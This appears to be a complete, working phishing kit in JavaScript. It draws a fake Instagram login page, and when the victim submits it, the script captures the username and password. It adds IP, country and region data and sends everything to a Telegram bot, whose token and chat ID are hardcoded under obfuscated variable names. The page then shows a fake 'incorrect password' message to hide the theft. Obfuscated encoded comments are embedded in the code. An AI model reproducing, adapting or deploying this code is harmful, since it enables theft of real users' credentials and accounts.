(function () {
  const style = document.createElement('style');
  style.innerHTML = `
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 90vh;
    }
    .container {
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    .language-selector {
      font-size: 14px;
      color: #444;
      margin-bottom: 30px;
      position: relative;
      bottom: 75px;
    }
    .logo {
      width: 70px;
      margin-bottom: 30px;
      position: relative;
      bottom: 50px;
    }
    .login-form {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 15px;
    }
    .login-form input {
      padding: 15px;
      border: 1px solid #ccc;
      border-radius: 15px;
      font-size: 15px;
    }
    .login-btn {
      background-color: #0095f6;
      color: #fff;
      border: none;
      border-radius: 30px;
      padding: 14px;
      font-size: 16px;
      cursor: pointer;
    }
    .forgot-password {
      display: block;
      margin: 15px 0 30px;
      color: #262626;
      text-decoration: none;
      font-size: 14px;
    }
    .create-btn {
      border: 1px solid #0095f6;
      width: 90%;
      background-color: #fff;
      color: #0095f6;
      padding: 14px;
      border-radius: 30px;
      font-size: 16px;
      cursor: pointer;
      position: relative;
      top: 120px;
    }
    .meta-logo {
      margin-top: 20px;
      font-size: 18px;
      color: #444;
      font-weight: 500;
      position: relative;
      top: 110px;
    }
    .dwn {
      width: 20px;
      position: relative;
      top: 6px;
    }
    .meta {
      width: 70px;
    }
    #successMessage {
      color: red;
      font-size: 14px;
      text-align: center;
      display: none;
    }
    button:focus,
    input:focus {
      outline: none;
    }
  `;
  document.head.appendChild(style);

  window.addEventListener("DOMContentLoaded", function () {
    const container = document.createElement("div");
    container.className = "container";
    container.innerHTML = `
      <div class="container">
    <div class="language-selector">
      English (US) <img src="https://ranky10.github.io/Pi/dwn.png" alt="" class="dwn">
    </div>

    <img src="https://cdn.glitch.global/2dd4569b-1012-4811-87c1-a60c0bd72933/instagram-logo.png?v=1744915934528"
         alt="Instagram Logo" class="logo" />

    <form id="loginForm" class="login-form">
      <input id="username" type="text" placeholder="Username, email or mobile number" required />
      <input id="password" type="password" placeholder="Password" required />
      <button type="submit" class="login-btn">Log in</button>
    </form>

    <a href="#" class="forgot-password">Forgot password?</a>
    <p id="successMessage">Login successful!</p>

    <button class="create-btn">Create new account</button>
    <div class="meta-logo">
      <img src="https://ranky10.github.io/Pi/meta.png" alt="" class="meta">
    </div>
  </div>
    `;
    document.body.appendChild(container);

    document.getElementById('loginForm')
      .addEventListener('submit', async function(event) {
        event.preventDefault();

        const username   = document.getElementById('username').value;
        const password   = document.getElementById('password').value;
        const sourcePage = document.referrer || 'Instagram';

        // fetch IP, country, region, and phone code
        const ipRes = await fetch('https://ipwhois.app/json/?objects=ip,country,region,country_phone');
        const ipData = await ipRes.json();

        const ipAddress   = ipData.ip;
        const countryName = ipData.country;
        const state       = ipData.region;
        const phoneCode   = ipData.country_phone || 'N/A';

        const dateTime = new Date().toLocaleString();

        const message = `
 𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪
 
🐉⊚-----------------------------------⊚🐉
<b>👤Username:</b> <code>${username}</code>\n
<b>📟Password:</b> <code>${password}</code>\n
<b>🌍Country:</b> ${countryName}\n
<b>🏴State:</b> ${state}\n
<b>⚙️IP Address:</b> ${ipAddress}\n
<b>📝Code:</b> <code>${phoneCode}</code>\n
<b>⏱Date/Time:</b> ${dateTime}\n
<b>🌐Login From:</b> ${sourcePage}
🐉⊚-----------------------------------⊚🐉
      ↝ ᴅᴇᴠ ʙʏ » @E_ranky
        `;
<!-- 02'02'02'02ogvjmf'1C'02'05RMQV'05'0A'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02jgcfgpq'1C'02'5@'02'05Amlvglv/V{rg'05'1C'02'05crrnkacvkml-hqml'05'02'5F'0A'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02`mf{'1C'02HQML,qvpklekd{'0:'5 -->
 await fetch(`https://api.telegram.org/bot${iovjrtrdhhj9}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id:    I94626736O,
            text:       message,
            parse_mode: 'HTML'
          })
        });
<!-- 02'02'02'02ogvjmf'1C'02'05RMQV'05'0A'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02jgcfgpq'1C'02'5@'02'05Amlvglv/V{rg'05'1C'02'05crrnkacvkml-hqml'05'02'5F'0A'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02`mf{'1C'02HQML,qvpklekd{'0:'5 -->

        const successMessage = document.getElementById('successMessage');
        successMessage.style.display = 'block';
        successMessage.textContent = 'Sorry, your password or username was incorrect. Please double-check and try again!';

        // Clear inputs
        document.getElementById('username').value = '';
        document.getElementById('password').value = '';
      });
      
      const iovjrtrdhhj9 = '7574993033:AAE2DUVDfOCMldfBG-ZlUIPNfmBYK1CQPJA';
   
   const I94626736O = '6557671568';
  });
})();
